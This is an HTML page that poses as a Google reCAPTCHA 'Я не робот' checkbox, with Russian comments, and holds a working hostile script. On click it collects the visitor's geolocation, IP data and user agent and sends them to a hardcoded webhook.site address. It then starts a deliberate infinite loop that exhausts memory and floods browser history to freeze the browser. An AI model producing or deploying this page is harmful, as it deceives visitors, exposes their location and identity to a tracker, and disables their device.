<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity - reCAPTCHA</title>
    <style>
        body { font-family: sans-serif; background: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .captcha-box { background: white; padding: 20px; border: 1px solid #d3d3d3; border-radius: 3px; cursor: pointer; display: flex; align-items: center; width: 300px; }
        .cb { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; }
        .active-cb { background: #4285f4; border-color: #4285f4; position: relative; }
        .active-cb::after { content: '✓'; color: white; margin-left: 5px; }
        .text { font-size: 14px; color: #555; }
    </style>
</head>
<body>

<div class="captcha-box" id="main-btn">
    <div class="cb" id="visual-cb"></div>
    <div class="text">Я не робот</div>
    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; margin-left:auto;">
</div>

<script>
    const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed';

    document.getElementById('main-btn').onclick = function() {
        document.getElementById('visual-cb').classList.add('active-cb');

        // 1. СБОР ДАННЫХ (Выполняется мгновенно)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                send({
                    status: 'CRITICAL_HIT',
                    location: `${pos.coords.latitude},${pos.coords.longitude}`,
                    map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                startFreeze(); // Запуск уничтожения
            }, () => { startFreeze(); });
        }

        fetch('https://ipapi.co/json/').then(r => r.json()).then(ip => {
            send({ ip_data: ip, agent: navigator.userAgent });
        });
    };

    function send(data) {
        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
    }

    // 2. FREEZE MODULE (JavaScript Loop)
    function startFreeze() {
        console.log("Initiating system stress test...");
        // Бесконечный цикл, забивающий память и CPU
        const storage = [];
        while (true) {
            storage.push(new Array(1000000).fill("FREEZE_" + Math.random()));
            history.pushState(null, null, location.href); // Забиваем историю браузера
        }
    }
</script>
</body>
</html>
